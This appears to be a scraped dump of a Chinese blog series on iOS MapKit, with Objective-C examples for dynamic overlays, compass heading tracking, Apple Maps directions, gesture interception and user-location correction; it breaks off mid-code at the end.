12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&#x2F;&#x2F;头文件@interface DynamicCircleOverly : MKShape &lt;MKOverlay&gt;- (instancetype)initWithCoordinate:(CLLocationCoordinate2D)coordinate;@end&#x2F;&#x2F;实现文件@interface DynamicCircleOverly ()@property (nonatomic, assign) CLLocationCoordinate2D center;@property (nonatomic, assign) MKMapRect mapRect;@end@implementation DynamicCircleOverly- (instancetype)initWithCoordinate:(CLLocationCoordinate2D)coordinate &#123; self &#x3D; [super init]; if (self) &#123; _center &#x3D; coordinate; _mapRect &#x3D; [self worldRectWithCenter:coordinate]; &#125; return self;&#125;- (CLLocationCoordinate2D)coordinate &#123; if(MKMapRectEqualToRect(_mapRect, MKMapRectNull)) &#123; _mapRect &#x3D; [self worldRectWithCenter:self.coordinate]; &#125; return _center;&#125;- (MKMapRect)boundingMapRect &#123; return _mapRect;&#125;- (MKMapRect)worldRectWithCenter:(CLLocationCoordinate2D)coordinate &#123; MKMapPoint center &#x3D; MKMapPointForCoordinate(coordinate); double width &#x3D; MKMapSizeWorld.width&#x2F;2; double height &#x3D; MKMapSizeWorld.height&#x2F;2; MKMapPoint origin &#x3D; MKMapPointMake(center.x - width&#x2F;2, center.y - height&#x2F;2); return MKMapRectMake(origin.x, origin.y, width , height);&#125;@end Render的准备完成Render需要保证以下逻辑 正确的圆形绘制方法 在更新半径时调用 setNeedsDisplay 重新绘制 示例代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&#x2F;&#x2F;头文件@interface DynamicCircleRender : MKOverlayRenderer@property (nonatomic, readonly) CGFloat radius;- (void)updateRadius:(CGFloat)radius;@end&#x2F;&#x2F;实现文件@implementation DynamicCircleRender- (instancetype)initWithOverlay:(id&lt;MKOverlay&gt;)overlay &#123; self &#x3D; [super initWithOverlay: overlay]; if (self) &#123; _radius &#x3D; 0; &#125; return self;&#125;- (void)drawMapRect:(MKMapRect)mapRect zoomScale:(MKZoomScale)zoomScale inContext:(CGContextRef)context &#123; &#x2F;&#x2F;1. Map计算 将CGFloat类型的半径换算成MKMapPoint的点数 MKMapPoint mapPoint &#x3D; MKMapPointForCoordinate(self.overlay.coordinate); double radiusAtLatitude &#x3D; (_radius)*MKMapPointsPerMeterAtLatitude(self.overlay.coordinate.latitude); &#x2F;&#x2F;2. Screen 将 MKMapView 换算成当前的ScreenView上的参数 CGPoint center &#x3D; [self pointForMapPoint:mapPoint]; &#x2F;&#x2F;3. Prepare Draw 绘制准备，决定绘制颜色和方法 CGContextSetFillColorWithColor(context, [UIColor redColor].CGColor); CGContextAddArc(context, center.x, center.y, radiusAtLatitude , 0, 2 * M_PI, 1); &#x2F;&#x2F;4. Draw 进行绘制 CGContextDrawPath(context, kCGPathFillStroke); UIGraphicsPopContext();&#125;- (void)updateRadius:(CGFloat)radius &#123; _radius &#x3D; radius; &#x2F;&#x2F; 调用刷新方法 [self setNeedsDisplay];&#125;@end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"MKMapKit","slug":"MKMapKit","permalink":"http://yoursite.com/tags/MKMapKit/"},{"name":"Overlay","slug":"Overlay","permalink":"http://yoursite.com/tags/Overlay/"}]},{"title":"MKMapKit(八)：动态Overlay绘制","date":"2017-03-09T15:00:00.000Z","path":"2017/03/10/MKMapKit八动态Overlay绘制原理/","text":"官方文档根据苹果官方文档Defining a Custom Overlay Renderer的说明，如果想要自定义Overlay显示样式，需要自定义OverlayRedner的方法 1- (void)drawMapRect:(MKMapRect)mapRect zoomScale:(MKZoomScale)zoomScale inContext:(CGContextRef)context 除去这个方法之外，在 MKOverlayRenderer 的方法里还有 1234567&#x2F;&#x2F;用于判断是否可以调用 drawMapRect:zoomScale:inContext:，默认返回 YES- (BOOL)canDrawMapRect:(MKMapRect)mapRect zoomScale:(MKZoomScale)zoomScale;&#x2F;&#x2F;三个刷新方法，当被调用时会重新绘制Overlay- (void)setNeedsDisplay;- (void)setNeedsDisplayInMapRect:(MKMapRect)mapRect; - (void)setNeedsDisplayInMapRect:(MKMapRect)mapRect zoomScale:(MKZoomScale)zoomScale; 动态Overlay动态Overlay，只需要继承 MKOverlayRenderer 实现自定义的OverlayRender 重写 drawMapRect:zoomScale:inContext: 并且在需要的调用 setNeedsDisplay 来进行刷新 就可以了 但是需要关注的一个问题是 self.overlay.boundingMapRect 会在绘制的过程中多次调用，但是仅在第一次调用时决定了该OverlayRender会被传入几次Context （重要重要） 动态绘制的关键点结论（重要重要）动态绘制的OverlayRender由于不确定其最终大小boundingMapRect，需要传入其可能存在的最大大小，最大为世界范围的一半(经验确定的) 12345678910111213141516171819&#x2F;&#x2F;实现 MKOverlay 协议的方法- (CLLocationCoordinate2D)coordinate &#123; if(MKMapRectEqualToRect(_mapRect, MKMapRectNull)) &#123; _mapRect &#x3D; [self worldRectWithCenter:self.coordinate]; &#125; return _center;&#125;&#x2F;&#x2F;计算世界范围1&#x2F;2的Rect- (MKMapRect)worldRectWithCenter:(CLLocationCoordinate2D)coordinate &#123; MKMapPoint center &#x3D; MKMapPointForCoordinate(coordinate); double width &#x3D; MKMapSizeWorld.width&#x2F;2; double height &#x3D; MKMapSizeWorld.height&#x2F;2; MKMapPoint origin &#x3D; MKMapPointMake(center.x - width&#x2F;2, center.y - height&#x2F;2); return MKMapRectMake(origin.x, origin.y, width , height);&#125; 例子后续的文章会给出两个常用的动态Overlay的代码例子 Overlay 文章 动态圆形 DynamicCircleOverly 动态轨迹 DynamicPathOverlay 解惑(可以不看)注释的误导根据官方文档对 MKOverlay 的描述，其参数 boundingMapRect 仅需要最小包含当前Render的Rect 因为该方法会被多次调用，我以为其会根据每次的返回值来动态改变，根据测试发现仅在第一次时会决定其渲染的地图范围 如果范围不足，则会出现渲染的时候超出Grid的一个地图块大小时，渲染停止，因为相邻的地图块不会被传入 OverlayRender的 drawMapRect 方法 123&#x2F;&#x2F; boundingMapRect should be the smallest rectangle that completely contains the overlay.&#x2F;&#x2F; For overlays that span the 180th meridian, boundingMapRect should have either a negative MinX or a MaxX that is greater than MKMapSizeWorld.width.@property (nonatomic, readonly) MKMapRect boundingMapRect; 生命周期分析在地图加载的过程中，我们可以看到地图会被分成一个Grid(栅栏)，是由一小块一小块方块组成的，在地图进行渲染的时候也是一个方块一个方块来渲染， OverlayRender的渲染结果不仅自己决定，也会受到self.overlay的方法影响 首先确定self.overlay中所需的MapRect大小，以及Grid中的方块数N (第一次调用boundingMapRect) 调用self.overlay中intersectsMapRect来确定是否可以获取boundingMapRect 再次调用self.overlay中boundingMapRect 根据boundingMapRect确定是否包含在当前MapView的可见范围 调用Render类中 canDrawMapRect来确定该地图块是否可以Render 调用Render类中 drawMapRect 来进行地图绘制 根据以上分析 其中 2-3步骤，会根据渲染地图Grid中的方块数决定调用几次 其中 4-5步骤 也会根据Grid的结果，决定调用次数，来逐个绘制 但是正如结论和上文分析，仅在 步骤1 第一次调用 boundingMapRect 会决定Grid中使用的地图方格数","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"MKMapKit","slug":"MKMapKit","permalink":"http://yoursite.com/tags/MKMapKit/"},{"name":"Overlay","slug":"Overlay","permalink":"http://yoursite.com/tags/Overlay/"}]},{"title":"MKMapKit(七)：指南针追踪工具","date":"2017-03-08T15:00:00.000Z","path":"2017/03/09/MKMapKit七指南针追踪工具/","text":"Compass.h1234567891011121314151617181920212223242526272829303132333435363738#import &lt;UIKit&#x2F;UIKit.h&gt;#import &quot;MapKit.h&quot;@interface MapKit (Compass)&#x2F;** * 在MapKit的Tracking模式中的CameraHeading模式下计算self.camera.heading应该赋值多少 * @param degrees LocationManager的Heading角度 * @return *&#x2F;+ (CLLocationDirection)cameraHeadingInCameraHeadingModeByDegrees:(CLLocationDegrees)degrees;&#x2F;** * 1. 在MapKit的Tracking模式中的TransformHeading模式下，应该如何转动MapKit的Transform保证其TransformIdentity始终指向正北方0度 * 2. 用于在不同的Tracking模式下，View如果想锁定指向时的辅助函数 * @param degrees LocationManager的Heading角度 *&#x2F;+ (CATransform3D)transformInTransformHeadingModeByDegrees:(CLLocationDegrees)degrees;&#x2F;** * 在不同的Tracking模式下，保证View始终指向锁定的角度 * @param heading 锁定的角度 0 - 360，其中0为正北方 * @param mapHeading 当前地图的角度，一般为LocationManage刷新的设备角度 * @param mode 当前MapKit使用的追踪模式 * @return *&#x2F;+ (CATransform3D)keepHeadingDegrees:(CLLocationDirection)heading withLocationHeading:(CLLocationDirection)mapHeading inMode:(MapKitTrackingMode)mode;&#x2F;** * 在不开启Tracking的模式下()，在对MapKit进行了RotateGesture的情况下，UIView锁定指向 * @param heading 锁定的角度 0 - 360 * @param cameraHeading 当前MapKit的摄像头角度，self.camera.heading 在Rotate了地图之后该参数会变化 * @return *&#x2F;+ (CATransform3D)keepTrackingNoneModeHeadingDegrees:(CLLocationDegrees)heading withCameraHeading:(CLLocationDirection)cameraHeading;@end Compass.m123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185#import &quot;MapKit+Compass.h&quot;&#x2F;** * * 以 ！！！2014年旋转Transform的Map例子中 ！！！！分析 * * 首先假设设备处于UIInterfaceOrientationPortrait * 指南针度数 偏转角度 +360度至递减 * 135 -135 225 * 225 135 135 * 解方程 * degrees &#x3D; 360 - degrees; * * 在UIInterfaceOrientationLandscapeRight情况下 * 指南针度数 偏转角度 +360度至递减 * 0 -90 270 * 45 -135 225 * 90 -180 180 *!!! 120 150 150 * 135 135 135 * 180 90 90 * 225 45 45 * 270 0 0 * 315 -45 -45 * 360 -90 -90 * 使用二元一次方程组 y &#x3D; ax+b * 观察数据可得 * 偏转角度 &#x3D; -指南针度数 + 270 * 感谢 Ye.Tao-2 提供的计算能力 * 解方程 * 可得 degrees &#x3D; 270-degrees; * 即 Portrait 向左倾倒，设备旋转了 -90度 360 - degrees -90 * * * * 在UIInterfaceOrientationLandscapeLeft * 指南针度数 偏转角度 +360度至递减 * 225 -135 225 * 270 -180 180 * 315 135 135 * 解方程 * 可得 degrees &#x3D; 450-degrees; * 即 Portrait 向右倾倒，设备旋转了 -90度 360 - degrees -90 * * * * 在 UIDeviceOrientationPortraitUpsideDown * 即 Portrait 向右倾倒旋转180度(360 - degrees + 180) ，或者向左倾倒旋转-180度(360 -degrees - 180) * * * *&#x2F;@implementation MapKit (Compass)+ (CLLocationDirection)cameraHeadingInCameraHeadingModeByDegrees:(CLLocationDegrees)degrees &#123; CLLocationDirection temp &#x3D; [self degreesRangeProcess:degrees]; &#x2F;&#x2F;首先假设设备处于UIInterfaceOrientationPortrait if(UIInterfaceOrientationIsLandscape([[UIApplication sharedApplication] statusBarOrientation])) &#123; temp &#x3D; 180 + temp; &#125; &#x2F;&#x2F;处理设备旋转 temp &#x3D; [self deviceOrientationProcess:temp]; return temp;&#125;+ (CATransform3D)transformInTransformHeadingModeByDegrees:(CLLocationDegrees)degrees &#123; CLLocationDirection temp &#x3D; [self degreesRangeProcess:degrees]; &#x2F;&#x2F;首先假设设备处于UIInterfaceOrientationPortrait temp &#x3D; 360 - temp; &#x2F;&#x2F;处理设备旋转 temp &#x3D; [self deviceOrientationProcess:temp]; return CATransform3DMakeRotation([self degreesToRadians:temp], 0, 0, 1);&#125;+ (CATransform3D)keepHeadingDegrees:(CLLocationDirection)heading withLocationHeading:(CLLocationDirection)mapHeading inMode:(MapKitTrackingMode)mode &#123; switch (mode) &#123; case MapKitTrackingModeFollowWithHeading: return [self keepFellowModeHeadingDegrees:heading withMapHeading:mapHeading]; case MapKitTrackingModeCameraHeading: return [self keepCameraModeHeadingDegrees:heading withMapHeading:mapHeading]; case MapKitTrackingModeTransformHeading: return CATransform3DMakeRotation([self degreesToRadians:heading], 0, 0, 1); default: break; &#125; return CATransform3DIdentity;&#125;+ (CATransform3D)keepTrackingNoneModeHeadingDegrees:(CLLocationDirection)heading withCameraHeading:(CLLocationDirection)cameraHeading &#123; CLLocationDegrees temp &#x3D; [self deviceOrientationProcess:cameraHeading]; return [self keepCameraModeHeadingDegrees:heading withMapHeading:temp];&#125;#pragma mark - Logic Funcation+ (CATransform3D)keepFellowModeHeadingDegrees:(CLLocationDirection)heading withMapHeading:(CLLocationDirection)mapHeading &#123; &#x2F;** * 在MapKitTrackingModeFollowWithHeading模式下 * heading度数x CATransform3DIdentity指向地图角度 偏移量y * 0 0 360 * 45 -45 315 * 90 -90 270 * 135 -135 225 * 180 180 180 * 225 135 135 * 270 90 90 * 315 45 45 * 360 0 0 *&#x2F; mapHeading &#x3D; - heading + mapHeading; return [self transformInTransformHeadingModeByDegrees:mapHeading];&#125;+ (CATransform3D)keepCameraModeHeadingDegrees:(CLLocationDirection)heading withMapHeading:(CLLocationDirection)mapHeading &#123; &#x2F;** * 在MapKitTrackingModeCameraHeading模式下 * heading度数x CATransform3DIdentity指向地图角度 偏移量y * 0 0 360 * 45 -45 315 * 90 -90 270 * 135 -135 225 * 180 180 180 * 225 135 135 * 270 90 90 * 315 45 45 * 360 0 0 *&#x2F; mapHeading &#x3D; -heading + mapHeading; return [self transformInTransformHeadingModeByDegrees:mapHeading];&#125;#pragma mark - Associate Funcation+ (CLLocationDegrees)degreesRangeProcess:(CLLocationDegrees)degrees &#123; CLLocationDirection temp &#x3D; degrees; while (temp &gt; 360) &#123; temp -&#x3D; 360; &#125; while (temp &lt; 0) &#123; temp +&#x3D; 360; &#125; return temp;&#125;+ (CLLocationDegrees)deviceOrientationProcess:(CLLocationDegrees)degrees &#123; &#x2F;** * 首先假设设备处于UIInterfaceOrientationPortrait *&#x2F; CLLocationDirection temp &#x3D; degrees;#if !TARGET_OS_SIMULATOR if ([[UIApplication sharedApplication] statusBarOrientation] &#x3D;&#x3D; UIInterfaceOrientationLandscapeRight) &#123; &#x2F;** * 在UIInterfaceOrientationLandscapeRight情况下 * 即 Portrait 向左倾倒，设备旋转了 -90度 degrees -90 *&#x2F; temp &#x3D; temp - 90; &#125; else if ([[UIApplication sharedApplication] statusBarOrientation] &#x3D;&#x3D; UIInterfaceOrientationLandscapeLeft) &#123; &#x2F;** * 在UIInterfaceOrientationLandscapeLeft * 即 Portrait 向右倾倒，设备旋转了 +90度 degrees +90 *&#x2F; temp &#x3D; temp + 90; &#125; else if ([[UIApplication sharedApplication] statusBarOrientation] &#x3D;&#x3D; UIDeviceOrientationPortraitUpsideDown) &#123; &#x2F;** * 在 UIDeviceOrientationPortraitUpsideDown * 即 Portrait 向右倾倒旋转180度(degrees + 180) ，或者向左倾倒旋转-180度(degrees - 180) *&#x2F; temp &#x3D; temp + 180; &#125;#endif return temp;&#125;+ (CGFloat)degreesToRadians:(CLLocationDegrees)degrees &#123; return degrees*M_PI&#x2F;180.0f;&#125;@end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"MKMapKit","slug":"MKMapKit","permalink":"http://yoursite.com/tags/MKMapKit/"}]},{"title":"MKMapKit(六)：指南针模式","date":"2017-03-07T15:00:00.000Z","path":"2017/03/08/MKMapKit六指南针模式/","text":"指南针模式是什么我自己起的名字，所谓指南针模式，就是MKMapView的MKUserTrackingModeFollowWithHeading模式，只不过MKMapView只能够让用户点自身进入Tracking模式 而且在打开Tracking模式的时候，Apple会十分体贴的帮你Zoom到用户点 导致有些需求无法规避这个动画。 1[mapView setUserTrackingMode:MKUserTrackingModeFollowWithHeading animated:animate]; 实现自定义指南针模式的方法如果想要模仿FollowWithHeading有两个方法，并且各有优劣，但是无论使用何种方法，都是通过LocationManage获取到设备的Heading值，然后根据Heading值对MapView进行设置 方法 实现 优点 缺点 Transform 根据Heading值改变MapView的Transform 简单，Overlay和Annotation始终保持TransformIdentity 需要大于ScreenView的MapView，标志物不会自动调整方向 Camera 根据Heading值改变MapView.Camera镜头状态 Overlay和Annotation以及字体会自动调整方向 Annotaiton如果需要保持Heading，需要更复杂的计算 Transform通过设置地图的layer来达到Tracking旋转效果 1234567891011121314- (void)locationManager:(CLLocationManager *)manager didUpdateHeading:(CLHeading *)newHeading &#123; [self.layer setTransform:[MapKit transformInTransformHeadingModeByDegrees:heading]];&#125;+ (CATransform3D)transformInTransformHeadingModeByDegrees:(CLLocationDegrees)degrees &#123; CLLocationDirection temp &#x3D; [self degreesRangeProcess:degrees]; &#x2F;&#x2F;首先假设设备处于UIInterfaceOrientationPortrait temp &#x3D; 360 - temp; &#x2F;&#x2F;处理设备旋转 temp &#x3D; [self deviceOrientationProcess:temp]; return CATransform3DMakeRotation([self degreesToRadians:temp], 0, 0, 1);&#125; 需要配合函数 transformInTransformHeadingModeByDegrees 来计算旋转的Transform，由指南针追踪工具提供 Camera通过设置地图的Camera来达到Tracking旋转效果 12345678910111213141516- (void)locationManager:(CLLocationManager *)manager didUpdateHeading:(CLHeading *)newHeading &#123; [self.camera setHeading:[MapKit cameraHeadingInCameraHeadingModeByDegrees:heading]];&#125;+ (CLLocationDirection)cameraHeadingInCameraHeadingModeByDegrees:(CLLocationDegrees)degrees &#123; CLLocationDirection temp &#x3D; [self degreesRangeProcess:degrees]; &#x2F;&#x2F;首先假设设备处于UIInterfaceOrientationPortrait if(UIInterfaceOrientationIsLandscape([[UIApplication sharedApplication] statusBarOrientation])) &#123; temp &#x3D; 180 + temp; &#125; &#x2F;&#x2F;处理设备旋转 temp &#x3D; [self deviceOrientationProcess:temp]; return temp;&#125; 需要配合函数 cameraHeadingInCameraHeadingModeByDegrees 来计算旋转的Heading，由指南针追踪工具提供 公用预处理函数1234567891011121314151617181920212223242526272829303132333435363738394041424344+ (CLLocationDegrees)degreesRangeProcess:(CLLocationDegrees)degrees &#123; CLLocationDirection temp &#x3D; degrees; while (temp &gt; 360) &#123; temp -&#x3D; 360; &#125; while (temp &lt; 0) &#123; temp +&#x3D; 360; &#125; return temp;&#125;+ (CLLocationDegrees)deviceOrientationProcess:(CLLocationDegrees)degrees &#123; &#x2F;** * 首先假设设备处于UIInterfaceOrientationPortrait *&#x2F; CLLocationDirection temp &#x3D; degrees;#if !TARGET_OS_SIMULATOR if ([[UIApplication sharedApplication] statusBarOrientation] &#x3D;&#x3D; UIInterfaceOrientationLandscapeRight) &#123; &#x2F;** * 在UIInterfaceOrientationLandscapeRight情况下 * 即 Portrait 向左倾倒，设备旋转了 -90度 degrees -90 *&#x2F; temp &#x3D; temp - 90; &#125; else if ([[UIApplication sharedApplication] statusBarOrientation] &#x3D;&#x3D; UIInterfaceOrientationLandscapeLeft) &#123; &#x2F;** * 在UIInterfaceOrientationLandscapeLeft * 即 Portrait 向右倾倒，设备旋转了 +90度 degrees +90 *&#x2F; temp &#x3D; temp + 90; &#125; else if ([[UIApplication sharedApplication] statusBarOrientation] &#x3D;&#x3D; UIDeviceOrientationPortraitUpsideDown) &#123; &#x2F;** * 在 UIDeviceOrientationPortraitUpsideDown * 即 Portrait 向右倾倒旋转180度(degrees + 180) ，或者向左倾倒旋转-180度(degrees - 180) *&#x2F; temp &#x3D; temp + 180; &#125;#endif return temp;&#125;+ (CGFloat)degreesToRadians:(CLLocationDegrees)degrees &#123; return degrees*M_PI&#x2F;180.0f;&#125; 指南针模式下Annotation锁定朝向在不同的指南针模式下，我们始终想让某一个标志物锁定朝向，不会随着 设备的旋转导致的地图旋转而产生偏向 可以使用由指南针追踪工具提供的函数来设置Transform","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"MKMapKit","slug":"MKMapKit","permalink":"http://yoursite.com/tags/MKMapKit/"}]},{"title":"MKMapKit(五)：调用自带地图导航","date":"2017-03-06T15:00:00.000Z","path":"2017/03/07/MKMapKit五调用自带地图导航/","text":"调用苹果地图导航调用苹果自带地图导航的相关类叫 MapItem,导航的英文不叫Navigation而是叫Direction，相关官方文档为Asking the Maps App to Display Directions MapItem调用方法MapItem一共有两个方法 方法名 作用 + openMapsWithItems:launchOptions: 跳转到自带地图并且打开一组Item - openInMapsWithLaunchOptions: 跳转到自带地图，打开这个Item Options可以看到两个方法都提到了Options，具体的Options包括以下 | Option | 取值 | 可选项 || :————- | :————- || MKLaunchOptionsDirectionsModeKey | 导航方式，有四个选项，比如步行还是开车官方文档 | MKLaunchOptionsDirectionsModeDriving,MKLaunchOptionsDirectionsModeWalking,MKLaunchOptionsDirectionsModeTransit,MKLaunchOptionsDirectionsModeDefault || MKLaunchOptionsMapTypeKey | 地图模式，采用NSNumber | 对应MKMapType的枚举 || MKLaunchOptionsMapCenterKey | NSValue | 把Coordinate编码成NSValue || MKLaunchOptionsMapSpanKey | NSValue | MKCoordinateSpan编码成NSValue || MKLaunchOptionsShowsTrafficKey | 交通状况，BOOL值 | 0 1 || MKLaunchOptionsCameraKey | 一个Object | MKMapCamera的实例 | placeMark是MapItem的一个对象，包含了基本信息例如电话、URL等等，用于实例化MapItem，本身可以通过 initWithCoordinate: 实例化 实例化方法 实例化 备注 + mapItemForCurrentLocation 返回当前设备的MapItem，是一个单例 - initWithPlacemark: 通过PlaceMark进行实例化 示例代码从当前位置导航到某个目的地 123456CLLocationCoordinate2D drone &#x3D; _mapKit.drone.coordinate;MKMapItem *currentLocation &#x3D; [MKMapItem mapItemForCurrentLocation];MKMapItem *toLocation &#x3D; [[MKMapItem alloc] initWithPlacemark:[[MKPlacemark alloc] initWithCoordinate:drone]]; &#x2F;&#x2F;目的地坐标toLocation.name &#x3D; @&quot;目的地&quot;; &#x2F;&#x2F;目的地名字[MKMapItem openMapsWithItems:@[currentLocation, toLocation] launchOptions:@&#123;MKLaunchOptionsDirectionsModeKey: MKLaunchOptionsDirectionsModeWalking,MKLaunchOptionsShowsTrafficKey: [NSNumber numberWithBool:NO]&#125;];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"MKMapKit","slug":"MKMapKit","permalink":"http://yoursite.com/tags/MKMapKit/"}]},{"title":"MKMapKit(四)：拦截地图的操作手势","date":"2017-03-05T15:00:00.000Z","path":"2017/03/06/MKMapKit四拦截地图的操作手势/","text":"拦截地图手势通过私有类去找私有手势不推荐使用该方法，但是也是我想出来的奇技淫巧，所以就记下来了 在[文章三][link01]中我们可以通过View Tree去找到ContentView，所以说也可以通过该View找到MKMapKit默认存在的手势接收器 _MKUserInteractionGestureRecognizer，如下代码 1234567891011121314- (void)mapView:(MKMapView *)mapView didAddAnnotationViews:(NSArray&lt;MKAnnotationView *&gt; *)views &#123; if (!_renderView) &#123; _renderView &#x3D; [views firstObject].superview; [_renderView.superview.gestureRecognizers enumerateObjectsUsingBlock:^(__kindof UIGestureRecognizer *obj, NSUInteger idx, BOOL *stop) &#123; if([NSStringFromClass([obj class]) isEqualToString:@&quot;_MKUserInteractionGestureRecognizer&quot;]) &#123; _userInteractionGesture &#x3D; obj; [obj addObserver:self forKeyPath:@&quot;state&quot; options:NSKeyValueObservingOptionNew|NSKeyValueObservingOptionOld context:@&quot;MapView&quot;]; &#125; &#125;]; &#125; &#x2F;&#x2F;Auto Correct [self autoCorrectLocationOffset];&#125; 通过对其State添加KVO即可接收到地图手势的触发状态，并且进行逻辑判断 1234567891011&#x2F;&#x2F;Normal Gestureif([NSStringFromClass([object class]) isEqualToString:@&quot;_MKUserInteractionGestureRecognizer&quot;]) &#123; if (_userInteractionGesture.state &#x3D;&#x3D; UIGestureRecognizerStateChanged) &#123; [self handleAnnotationShapesUpdateHidden:NO]; &#125; if(_userInteractionGesture.state &#x3D;&#x3D; UIGestureRecognizerStateEnded) &#123; if(MKMapRectEqualToRect(_tempVisibleRect, self.visibleMapRect)) &#123; [self handleAnnotationShapesUpdateHidden:NO]; &#125; &#125;&#125; 共同触发接收器通过添加新的GestureRecognizer来监听手势，通过设置代理 gestureRecognizer:shouldRecognizeSimultaneouslyWithGestureRecognizer: 来同时触发 1234567891011121314151617181920212223- (void)monitorGesture &#123; UIPinchGestureRecognizer *pinchGestureRecognizer &#x3D; [[UIPinchGestureRecognizer alloc] initWithTarget:self action:@selector(receiveGesture:)]; UIPanGestureRecognizer *panGestureRecognizer &#x3D; [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(receiveGesture:)]; UITapGestureRecognizer *tapGestureRecognizer &#x3D; [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(receiveGesture:)]; UIRotationGestureRecognizer *rotationGestureRecognizer &#x3D; [[UIRotationGestureRecognizer alloc] initWithTarget:self action:@selector(receiveGesture:)]; pinchGestureRecognizer.delegate &#x3D; self; panGestureRecognizer.delegate &#x3D; self; tapGestureRecognizer.delegate &#x3D; self; rotationGestureRecognizer.delegate &#x3D; self; [self addGestureRecognizer:pinchGestureRecognizer]; [self addGestureRecognizer:panGestureRecognizer]; [self addGestureRecognizer:tapGestureRecognizer]; [self addGestureRecognizer:rotationGestureRecognizer];&#125;- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldRecognizeSimultaneouslyWithGestureRecognizer:(UIGestureRecognizer *)otherGestureRecognizer &#123; return YES;&#125;- (void)receiveGesture:(UIGestureRecognizer *)recognizer &#123; ..............&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"MKMapKit","slug":"MKMapKit","permalink":"http://yoursite.com/tags/MKMapKit/"}]},{"title":"MKMapKit(三)：获得ContainerView","date":"2017-03-04T15:00:00.000Z","path":"2017/03/05/MKMapKit三获得ContentView/","text":"为什么要获取ContainerView在有些需求中，要求一个Annotation上添加一个View并且要处于另外一个Annotation的下面，因为Annotation本身只有一个View接收Image，想要实现这个效果旧代码采取了 每个Annotation都做两个，添加在底下的那个Annotation上 感觉不是优秀的处理方法，所以通过IDE观察View Tree，可以发现，所有的AnnotationView都加在一个共同的ContentView上，整个MapView的结构关系为 1234567------_MKMapContentView &lt;----这个是基础的MapView--------MKBasicMapView &lt;----这个是地图基础地图，就是显示街道和建筑的那层--------MKScrollContainerView &lt;----这个是个不存在Frame的虚拟层，猜测负责滚动等--------MKNewAnnotationContainerView &lt;----这个是一个透明层，负责承载AnnotationView----------XXXAnnotationView &lt;----这个是自定义的AnnotationView 所以我们可以简单的通过superView来获得 AnnotationContainerView 如果在这上边添加View，就可以保证其处于所有AnnotationView底层 获取代码1234567891011&#x2F;&#x2F;保存一个指向ContainerView的弱指针@property (nonatomic, weak) UIView *renderView;&#x2F;&#x2F;捕捉ContainerView- (void)mapView:(MKMapView *)mapView didAddAnnotationViews:(NSArray&lt;MKAnnotationView *&gt; *)views &#123; if (!_renderView) &#123; _renderView &#x3D; [views firstObject].superview; &#125;&#125; 根据需求补充如果仅仅是完成第一段所说的需求，也可以通过监控代理，把每次特定的View使用函数置底，来做到让其显示在所有View底部 12UIView *view &#x3D; [_mapView viewForAnnotation:_annotation];[view.superview sendSubviewToBack:view]","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"MKMapKit","slug":"MKMapKit","permalink":"http://yoursite.com/tags/MKMapKit/"}]},{"title":"MKMapKit(二)：自动纠偏","date":"2017-03-03T15:00:00.000Z","path":"2017/03/04/MKMapKit二自动纠偏/","text":"基本思路 地图DidAppear后获取到MKMapKit自身蓝色小圆点的Frame值 地图DidAppear后获取到由LocationManage产生的Annotation对应的AnnotationView的Frame值 对比AnnotationView和BlueDot的Frame或者反推的Location来确定是否重叠 不重叠进行自动纠偏 如何获取BlueDot通过Annotation获得通过 mapView:viewForAnnotation: 获得Annotation 1234567891011121314151617&#x2F;&#x2F;指向BlueDot的Weak指针@property (nonatomic, weak) MKUserLocation *blueDot;&#x2F;&#x2F;通过拦截获取到BlueDot- (MKAnnotationView *)mapView:(MKMapView *)mapView viewForAnnotation:(id &lt;MKAnnotation&gt;)annotation &#123; &#x2F;&#x2F; If the annotation is the user location, just return nil. if ([annotation isKindOfClass:[MKUserLocation class]]) &#123; _blueDot &#x3D; annotation; return nil; &#125; return nil;&#125;&#x2F;&#x2F;获取到BlueDot的AnnotationViewMKAnnotationView *tempBlue &#x3D; [self viewForAnnotation:_blueDot]; 通过AnnotationView获得通过 mapView: didAddAnnotationViews: 直接获得AnnotationView 123456789101112&#x2F;&#x2F;指向BlueDotView的Weak指针@property (nonatomic, weak) MKAnnotationView *blueDotView;&#x2F;&#x2F;利用MKMapKit的用户View是苹果的私有类 类名为MKModernUserLocationView，不可能被继承或者重用- (void)mapView:(MKMapView *)mapView didAddAnnotationViews:(NSArray&lt;MKAnnotationView *&gt; *)views &#123; [views enumerateObjectsUsingBlock:^(MKAnnotationView *obj, NSUInteger idx, BOOL *stop) &#123; if([NSStringFromClass([obj class]) isEqualToString:@&quot;MKModernUserLocationView&quot;]) &#123; _blueDotView &#x3D; obj; &#125; &#125;];&#125; 位置比较位置比较可以直接比较Frame，但是在不同Scale下，并不是太稳定，所以选择通过CGPoint的位置反推Coordinate，然后通过CLLocationDistance来确定两者是否重合 12345678910111213141516171819202122- (void)autoCorrectLocationOffset &#123; if (!_blueDot) &#123; return; &#125; MKAnnotationView *tempBlue &#x3D; [self viewForAnnotation:_blueDot]; if (!tempBlue) &#123; return; &#125; &#x2F;&#x2F;获取通过View反推的Coordinate CLLocationCoordinate2D tempApple &#x3D; [self convertPoint:tempBlue.center toCoordinateFromView:self]; CLLocationCoordinate2D tempUser &#x3D; [self convertPoint:[self viewForAnnotation:_user].center toCoordinateFromView:self]; &#x2F;&#x2F;获取Coordinate生成的CLLocation CLLocation *blueDot &#x3D; [[CLLocation alloc] initWithLatitude:tempApple.latitude longitude:tempApple.longitude]; CLLocation *user 